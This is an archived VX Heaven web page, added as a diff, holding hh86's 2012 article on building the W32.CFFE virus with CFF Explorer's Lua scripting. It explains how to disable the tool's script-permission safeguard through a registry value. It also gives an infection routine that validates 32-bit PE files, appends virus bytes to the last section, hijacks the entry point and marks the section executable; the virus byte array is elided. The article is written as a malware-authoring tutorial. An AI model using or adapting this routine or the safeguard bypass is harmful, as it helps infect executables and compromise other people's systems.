@@ -1,0 +1,189 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> hh86 'Infect Using CFF Explorer Scripting' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="hh86"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, hh86,Infect Using CFF Explorer Scripting, image, script, readword, explorer, section, offset, fileheader, machine, tool, magic, getoffset, header, field, readdword, data"/>
+<meta name="Description" content="There is a tool, CFF Explorer, it is my favorite. I saw myself in a dream writing this very same article, with no intro. So, I knew to make my first virus using this tool. I call it W32.CFFE."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c32aaae3fba865f2fed114c152d0af4e3b8b9b26-1498756487-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhh08.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Infect Using CFF Explorer Scripting</h1><p><a href="/lib/?lang=en&amp;author=hh86"> hh86</a><br/> <em><a href="/vx.php?fid=2009#f2009">Valhalla #3</a></em><br/> <em>December 2012</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhh08.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VT#vhh08">Back to index</a>] [<a href="/lib/vhh08.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#c1">About CFFE</a></li>
+<li><a href="#c2">What is it?</a></li>
+<li><a href="#c3">Can I Has Priviledges?</a></li>
+<li><a href="#c4">Manuscriptum</a></li>
+<li><a href="#c5">Tomorrow Never Knows</a></li>
+</ul>
+<h2><a name="c1"></a>About CFFE</h2>
+<p>There is a tool, CFF Explorer, it is my favorite. I saw myself in a dream writing this very same article, with no intro. So, I knew to make my first virus using this tool. I call it W32.CFFE.</p>
+<h2><a name="c2"></a>What is it?</h2>
+<p>CFF Explorer is a wonderful tool to edit PE files. It would take quite a while to write down all of its feature and possible uses. It supports plug-ins and also has its own scripting language (modified version of Lua) to automate the edition of files (I have used it to edit other things too).</p>
+<h2><a name="c3"></a>Can I Has Priviledges?</h2>
+<p>CFF Explorer has a good security mechanism for some functions that could be used to compromise the system. The default behavior is to ask the user for permission to let the script use them. While my script code is capable of infection, it does not use any priviledge function. It is a good idea and reminds me of UAC. But it is one that can be disabled.</p>
+<p>I thought there would be a configuration file, but there is none. Therefore I looked into the registry and found its "NTCore" key in HKCU/Software. The configuration data is stored in a REG_BINARY value by the name of "Settings". Currently, I have version "7.9.0.0" of CFF Explorer installed. I did not bother to check previous versions. The corresponding field entry to disable its security mechanism is a 32-bit (boolean) at offset 0x78.</p>
+<h2><a name="c4"></a>Manuscriptum</h2>
+<p>Script files have extension ".cff". Via command-line you can run your script by passing its name as an argument for CFF Explorer. Also, scripts supports arguments, much in the same way of C. In the documentation, it is written that you can run functions using argument "-CFFSCRIPT=". This is true, and partially describes the fact that you can pass as an argument the full source code of your script via command-line.</p>
+<p>I would not recommend to do this from Windows prompt, because you must learn to escape some characters. CreateProcess API does not complains about it.</p>
+<p>Since .cff is a registered extension, you can extract the path from the registry to lookup the installation directory:</p>
+<pre class="source">
+	"HKEY_CLASSES_ROOT\CFFExplorer.Script\shell\open\command"
+</pre>
+<p>I did not wanted to make a script code to be a virus. So no "CFF.virus" thing, someone else might try this someday, simply by using the find files functions (you require priviledges for this). Instead, I made the infection procedure as a script, which is actually, a pretty standard file edition in this kind of tools. ;) Script and machine code do not infect other .cff files, so no cross-platform. x86 machine code is carried as an array within the script.</p>
+<p>Here is what the script code looks like (a simplified version of the script that is used in the virus):</p>
+<div class="lua" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">f <span style="color: #66cc66;">=</span> OpenFile<span style="color: black;">&#40;</span><span style="color: #66cc66;">...</span> filename <span style="color: #66cc66;">...</span><span style="color: black;">&#41;</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">-- 23117 instead of 0x5a4d</span><br/>
+<br/>
+<span style="color: #aa9900; font-weight: bold;">if</span> ReadWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">==</span> <span style="color: #cc66cc;">23117</span> <span style="color: #aa9900; font-weight: bold;">and</span> ReadWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">2</span><span style="color: black;">&#41;</span> !<span style="color: #66cc66;">=</span> <span style="color: #cc66cc;">1986</span> <span style="color: #aa9900; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; PE <span style="color: #66cc66;">=</span> GetOffset<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span><br/>
+<br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 22 instead of 0x16 (IMAGE_NT_HEADERS.FileHeader.Characteristics offset)</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 92 instead of 0x5c (IMAGE_NT_HEADERS.OptionalHeader.Subsystem offset)</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 4092 instead of IMAGE_FILE_SYSTEM</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 17744 instead of &quot;PE&quot;</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 332 instead of 0x14c (IMAGE_FILE_MACHINE_I386)</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 2 instead of IMAGE_FILE_EXECUTABLE_IMAGE</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 2 instead of IMAGE_SUBSYSTEM_GUI</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 224 instead of 0xe0 (use this value as standard size of SizeOfOptionalHeader)</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- check PE signature</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- FileHeader.Machine == IMAGE_FILE_MACHINE_I386</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- IsPE64 to discard file with IMAGE_NT_OPTIONAL_HDR64_MAGIC</span><br/>
+&nbsp; &nbsp; <span style="color: black; font-style: italic;">-- must be valid image file, and no system file</span><br/>
+<br/>
+&nbsp; &nbsp; d <span style="color: #66cc66;">=</span> <span style="color: #cc66cc;">4096</span><br/>
+&nbsp; &nbsp; c <span style="color: #66cc66;">=</span> ReadWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> PE <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">22</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; <span style="color: #aa9900; font-weight: bold;">if</span> ReadDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> PE<span style="color: black;">&#41;</span> <span style="color: #66cc66;">==</span> <span style="color: #cc66cc;">17744</span> <span style="color: #aa9900; font-weight: bold;">and</span> ReadWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> PE <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">4</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">==</span> <span style="color: #cc66cc;">332</span> <span style="color: #aa9900; font-weight: bold;">and</span> IsPE64<span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span> <span style="color: #66cc66;">==</span> <span style="color: #aa9900;">false</span> <span style="color: #aa9900; font-weight: bold;">and</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; c &amp; <span style="color: #cc66cc;">2</span> <span style="color: #66cc66;">==</span> <span style="color: #cc66cc;">2</span> <span style="color: #aa9900; font-weight: bold;">and</span> c &amp; d !<span style="color: #66cc66;">=</span> d <span style="color: #aa9900; font-weight: bold;">and</span> ReadWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> PE <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">92</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">==</span> <span style="color: #cc66cc;">2</span> <span style="color: #aa9900; font-weight: bold;">and</span> ReadWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> p <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">20</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">==</span> <span style="color: #cc66cc;">224</span> <span style="color: #aa9900; font-weight: bold;">then</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 40 instead of 0x28 (sizeof IMAGE_SECTION_HEADER)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 20 instead of 0x14 (IMAGE_SECTION_HEADER.PointerToRawData offset)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 16 instead of 0x10 (IMAGE_SECTION_HEADER.SizeOfRawData offset)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- check PE size (discard file with data outside because AddDataToLastSection might overwrite it)</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SH <span style="color: #66cc66;">=</span> GetOffset<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">5</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">+</span> <span style="color: black;">&#40;</span>ReadWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> PE <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">6</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">-</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">*</span> <span style="color: #cc66cc;">40</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #aa9900; font-weight: bold;">if</span> GetFileSize<span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span> <span style="color: #66cc66;">==</span> ReadDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> SH <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">20</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">+</span> ReadDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> SH <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">16</span><span style="color: black;">&#41;</span> <span style="color: #aa9900; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; h <span style="color: #66cc66;">=</span> AddDataToLastSection<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> <span style="color: black;">&#123;</span><span style="color: #66cc66;">...</span> here goes the array of virus values <span style="color: #66cc66;">...</span><span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #aa9900; font-weight: bold;">if</span> h <span style="color: #aa9900; font-weight: bold;">then</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 40 instead of 0x28 (IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint offset)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 36 instead of 0x24 (IMAGE_SECTION_HEADER.Characteristics offset)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 200 instead of 0xc8 (offset of Load Config data directory entry)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">-- 160 instead of 0xa0 (offset of reloc data directory entry)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteWord<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">2</span><span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">1986</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteQword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> p <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">200</span><span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteQword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> p <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">160</span><span style="color: #66cc66;">,</span> <span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> h <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">1</span><span style="color: #66cc66;">,</span> ReadDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> PE <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">40</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> PE <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">40</span><span style="color: #66cc66;">,</span> OffsetToRva<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> h<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> SH <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">36</span><span style="color: #66cc66;">,</span> ReadDword<span style="color: black;">&#40;</span>f<span style="color: #66cc66;">,</span> SH <span style="color: #66cc66;">+</span> <span style="color: #cc66cc;">36</span><span style="color: black;">&#41;</span> | <span style="color: #cc66cc;">0x20000000</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SaveFile<span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #aa9900; font-weight: bold;">end</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #aa9900; font-weight: bold;">end</span><br/>
+&nbsp; &nbsp; <span style="color: #aa9900; font-weight: bold;">end</span><br/>
+&nbsp; &nbsp; CloseHandle<span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span><br/>
+<span style="color: #aa9900; font-weight: bold;">end</span><br/>
+&nbsp;</div>
+<p>If you want the script code to run faster, you might want to use OpenFile function instead of file name as parameter for all functions. I used it so that we can save the modification only if no errors occurred (unfortunately there is no exception handling here, so must save in the last and most safe moment).</p>
+<p>Lua, just like VBScript (and Visual Basic), process multiple conditions in
+IF by making the evaluation and saving the results until THEN, for example:</p>
+<pre class="source">
+if a()!=1 and b==1 then
+</pre>
+<p>Let's suppose that a() returns 1, b() is executed regardless the result of the previous evaluation. So longer IFs with lots of conditions take longer time, and also if they call many functions that could have an error, they make the code more likely to crash if numerous bad things happen. JScript in the other hand does not do this. If speed is the concern, then use an IF for each check.</p>
+<p>One might think PE64 function would be enough to discard PE32+ files and invalid ones. But it only checks that IMAGE_OPTIONAL_HEADER.Magic field is IMAGE_NT_OPTIONAL_HDR64_MAGIC, ignoring IMAGE_FILE_HEADER.Machine field. If IMAGE_DOS_HEADER.Magic is invalid, or IMAGE_DOS_HEADER.e_lfanew is invalid, or IMAGE_NT_HEADERS.Signature is invalid, function returns false PE32. You might incorrectly assume file is valid and also not PE64. So, we must check in the code. After all checks are passed, I only use IsPE64 to check the first field noted here, to avoid a ReadWord, which takes more bytes.</p>
+<p>If you want to get an offset fast, you can use GetOffset function. In the documentation, the ID (indexes) constant looks like "PE_DosHeader", but we can use numeric index instead, to save some bytes.</p>
+<pre class="source">
+	-- 60 instead of 0x3c (offset of IMAGE_DOS_HEADER.e_lfanew)
+	PE = ReadDword(f, 60)
+</pre>
+<p>We can use:</p>
+<pre class="source">
+	-- PE_NtHeaders == 1
+	PE = GetOffset(f, 1)
+</pre>
+<p>Get to last section header is a rather lengthy equation. GetOffset helps here too. However, we will get the offset of the beginning of the section headers. It also seems to use SizeOfOptionalHeader to get this particular offset, which is better than using NumberOfRvaAndSizes. ;)</p>
+<p>Using no GetOffset:</p>
+<pre class="source">
+	-- 20 instead of 0x14 (offset of IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader)
+	-- 24 instead of 0x18 (offset of IMAGE_NT_HEADERS.OptionalHeader)
+	-- 6 is IMAGE_NT_HEADERS.FileHeader.NumberOfSections
+	-- 40 instead of 0x28 (sizeof IMAGE_SECTION_HEADER)
+
+	SH = PE + ReadWord(f, PE + 20) + 24 + (ReadWord(f, PE + 6) - 1) * 40
+</pre>
+<p>Using GetOffset:</p>
+<pre class="source">
+	-- 5 instead of "PE_SectionHeaders"
+	-- 6 is IMAGE_NT_HEADERS.FileHeader.NumberOfSections
+	-- 40 instead of 0x28 (sizeof IMAGE_SECTION_HEADER)
+
+	SH = GetOffset(f, "PE_SectionHeaders") + (ReadWord(f, PE + 6) - 1) * 40
+</pre>
+<p>Or</p>
+<pre class="source">
+	-- 5 instead of "PE_SectionHeaders"
+
+	SH = GetOffset(f, 5) + (ReadWord(f, PE + 6) - 1) * 40
+</pre>
+<h2><a name="c5"></a>Tomorrow Never Knows</h2>
+<p>CFF Explorer has a very impressive architecture, and it is a free tool. I couldn't ask for anything better to play with. CFF Explorer also supports Extensions (DLL files), an x86 version of the script could be made to spread from PE to PE. I might try it someday.</p>
+<div align="right">
+hh86<br/>
+November 2012
+</div>
+[<a style="" href="/lib/?lang=EN&amp;index=VT#vhh08">Back to index</a>] [<a href="/lib/vhh08.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhh08">de</a><a href="/lib/index.php?lang=en&amp;id=vhh08">en</a><a href="/lib/index.php?lang=es&amp;id=vhh08">es</a><a href="/lib/index.php?lang=it&amp;id=vhh08">it</a><a href="/lib/index.php?lang=fr&amp;id=vhh08">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhh08">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhh08">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhh08">ua</a></div>
+</body>
+</html>
